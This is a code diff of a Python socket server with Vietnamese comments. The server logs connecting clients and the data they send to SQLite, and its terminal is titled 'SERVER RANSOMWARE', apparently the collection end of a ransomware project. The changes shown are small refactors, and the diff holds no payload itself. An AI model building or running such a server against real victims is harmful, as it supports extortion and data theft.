@@ -2,8 +2,8 @@
 # Import modules
 import os
 import sys
-import datetime
 import sqlite3
+import datetime
 from time import sleep, time
 from threading import Thread
 from modules.color import System, Col
@@ -11,9 +11,9 @@ from socket import socket, AF_INET, SOCK_STREAM
 
 # Lớp Server để xử lý các kết nối và truyền dữ liệu
 class Server:
-    def __init__(self, HOST: str, PORT: str) -> None:
-        self.host = HOST
-        self.port = PORT
+    def __init__(self, HOST: str, PORT: int) -> None:
+        self.host: str = HOST
+        self.port: int = PORT
         self.logserver = SqliteLog()
         self.server = socket(AF_INET, SOCK_STREAM)
         self.client_connect_time = {}  # Lưu thời gian kết nối của mỗi client
@@ -29,8 +29,8 @@ class Server:
                     break
                 if not isinstance(data, bytes): 
                     data = data.encode('utf-8')
-                Console(address[0], round(len(data)/1024, 3), 1)
                 self.logserver.activity(address[0], data)
+                Console(address[0], round(len(data)/1024, 3), 1)
             except Exception as error:
                 Console(address[0], error, 3)
                 self.logserver.error(error)
@@ -133,7 +133,7 @@ class SqliteLog:
             self.conn.close()
 
 # Hàm Console để in thông điệp ra console 
-def Console(ip: str, msg: str, select: int=0) -> None:
+def Console(ip: str, msg: str, select) -> None:
     messages = {
         0: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Green}Connect to the Server{Col.White}.",
         1: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Yellow}Packet data: {msg} KB{Col.White}.",
@@ -145,8 +145,12 @@ def Console(ip: str, msg: str, select: int=0) -> None:
 # Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
 if __name__ == '__main__':
     try:
-        System().clear()
-        Server().Listening()
+        Terminal = System()
+        Terminal.clear()
+        Terminal.title('SERVER RANSOMWARE')
+        Terminal.size(320, 240)
+        Terminal.init()
+        Server('192.168.1.12', 19100).Listening()
     except Exception as error:
         Console('ERROR', error, 3)
         sleep(10)
